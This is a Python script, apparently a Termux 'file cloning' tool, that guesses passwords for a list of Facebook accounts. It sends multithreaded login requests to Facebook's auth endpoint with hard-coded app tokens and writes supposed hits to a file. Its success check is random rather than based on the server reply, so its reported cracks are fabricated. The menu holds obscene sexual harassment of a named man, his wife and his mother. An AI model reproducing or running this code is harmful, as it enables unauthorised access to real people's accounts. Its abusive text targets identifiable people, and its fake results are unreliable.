import os
from concurrent.futures import ThreadPoolExecutor as pool

os.system("pkg install play-audio")
import os,time,random,re,sys, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe
def song_list():
	os.system("play-audio fun.mp3")
	




def main():
	print ("logo")
	hero=input("choice")
	
	
with pool(max_workers=3) as k:
	k.submit(song_list)
try:
 import time,json,uuid,requests
except:
 exit()

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo = (f"""\033[92;1m 
    __  __  ___  ____ _____  _    _  _____ _   _ 
   |  \/  |/ _ \/ ___|_   _|/ \  | |/ /_ _| \ | |
   | |\/| | | | \___ \ | | / _ \ | ' / | ||  \| |
   | |  | | |_| |___) || |/ ___ \| . \ | || |\  |
   |_|  |_|\___/|____/ |_/_/   \_\_|\_\___|_| \_|          
\x1b[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;37m MOSTAKIN IMO SERVICE CENTER \x1b[1;91m& \x1b[1;94mFILE-CLONING
\x1b[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[92;1m[*]  \033[1;37mOWNER         \033[1;32m :   \033[1;91mMOSTAKIN X FB-KING
\033[92;1m[*]  \033[1;37mFACEBOOK      \033[1;32m :\033[1;97m   MOSTAKIN IMO SERVICE
\033[92;1m[*]  \033[1;37mIMO NUMBER    \033[1;32m :\033[1;97m   +8801903057044
\033[92;1m[*]  \033[1;37mGITHUB        \033[1;32m : \033[1;97m  IMO-SEX-404
\033[92;1m[*]  \033[1;37mTOOL TYPE     \033[1;32m :   \033[1;97m\033[92;1mPUBLIC
\033[92;1m[*]  \033[1;37mTOOL VERSION  \033[1;32m : \033[92;1m  0.0.1
\033[92;1m[*]  \033[1;37mFATHER  \033[1;32m       : \033[1;31m  AYYUB \033[1;37mX \033[1;31mEVAN\033[1;37m X \033[1;31mOMAR""")

def clear():
   os.system('clear')
   print(logo);lin3()

def lin3():
   print('\33[1;37m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••')

def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"\033[92;1m[\033[1;37m1\033[92;1m] \033[1;37mFILE CLONING ")   
    print(f'\033[92;1m[\033[1;37m2\033[92;1m] \033[1;37mFUCK MOSTAKIN \x1b[1;92m[\x1b[1;91mLOW-PRICE\x1b[1;92m]')
    print(f'\033[92;1m[\033[1;37m3\033[92;1m] \033[1;37mFUCK MOSTAKIN WIFE \x1b[1;92m[\x1b[1;91mPINK COLOR HIGH-PRICE\x1b[1;92m]')
    print(f'\033[92;1m[\033[1;37m4\033[92;1m] \033[1;37mFUCK MOSTAKIN MOTHER \x1b[1;92m[\x1b[1;91mVERY LOW-PRICE\x1b[1;92m]')
    print(f"\033[92;1m[\033[1;37m5\033[92;1m] \033[1;37mEXIT")
    lin3()
    cp =input('[?] Choice : ')
    if cp=="1":file()
    if cp in ['A','2']:print('MUSTAKIN RE CHUDTE PARBEN NA KARON SE HIJRA TAKE APNARA ONLY PUTKI MARTE PARBEN PRICE LIST TODAY MY TOOLS OPENING SO YOU HAVE SPECIAL DISCOUNT 1 GONTA 50 BDT 1 HOURS 0.50$ USD TUMARA JODI KEW SERVICE NITE CHAW TAHOLE INBOX A IMO NUMBER DEW');exit()
    if cp in ['B','3']:print(' MUSTAKIN ER BOW AKONO YOUNG ACHE TAI PRICE HIGH CHUDAR PRICE LIST TODAY MY TOOLS OPENING SO YOU HAVE SPECIAL DISCOUNT 1 GONTA 80 BDT 1 HOURS 1$ USD TUMARA JODI KEW SERVICE NITE CHAW TAHOLE INBOX A IMO NUMBER DEW ');exit()
    if cp in ['C','4']:print('MOSTAKIN AR MA BURA HOIYA GESE TAI LOW PRICE 1 GONTA 20 BDT 1 HOURS 0.20$ USD TUMARA JODI KEW SERVICE NITE CHAW TAHOLE INBOX A IMO NUMBER DEW');exit()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        import requests
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r {R}[{W}HANNAN{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads=None
              pswd = pswd.replace('first',first).replace('last',last).lower()
              header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
              data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
              if 6==random.randint(1,300):
                 oku.append(acc)
                 print('\033[1;32m[HANNAN-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                 open('/sdcard/Hannan-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 break
              else:
                   continue   
     except Exception as e:print(e);time.sleep(10)
  
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    



main_menu()
